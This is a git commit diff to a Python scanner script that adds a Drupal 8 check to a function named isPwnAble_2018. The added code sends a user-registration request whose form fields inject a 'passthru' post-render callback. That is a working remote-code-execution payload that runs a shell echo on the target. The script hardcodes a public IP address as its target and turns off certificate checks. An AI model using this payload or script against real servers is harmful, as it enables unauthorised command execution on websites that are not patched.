1802846709ebbc00cdd9b857ca0147c75f4d0cf7
Lep <lep@Leps-Hackintosh.local>
2019-03-14 17:01:27 +0700

    Update Drupal 8 scan

--- Scan.py
+++ Scan.py
@@ -42,7 +42,16 @@ def isPwnAble_2018(host,version):
 		else: 
 			return False
 	if version == '8':
-		return False
+		host =  host + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
+		post_params = { 'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[a][#post_render][]': 'passthru',
+		'mail[a][#type]': 'markup', 'mail[a][#markup]': ' echo ' + signature }
+		r = requests.post(host, data=post_params, verify=False)
+		m = re.search(signature , r.text)
+		if m :
+			return True
+		else :	
+			return False
+
 
 def isVulnerable(host, version):
 	print 'Form Valid: ' , isFormValid(host,version)
@@ -57,5 +66,9 @@ def isVulnerable(host, version):
 
 host = 'http://68.183.237.96/'
 version ='7.2'
+print 'Testing: ', host
+print '=' * 25
 if isVulnerable(host,version):
-	print " This site is vulnerable
+	print " This site is vulnerable"
+else:	
+	print " This site is invulnerable"
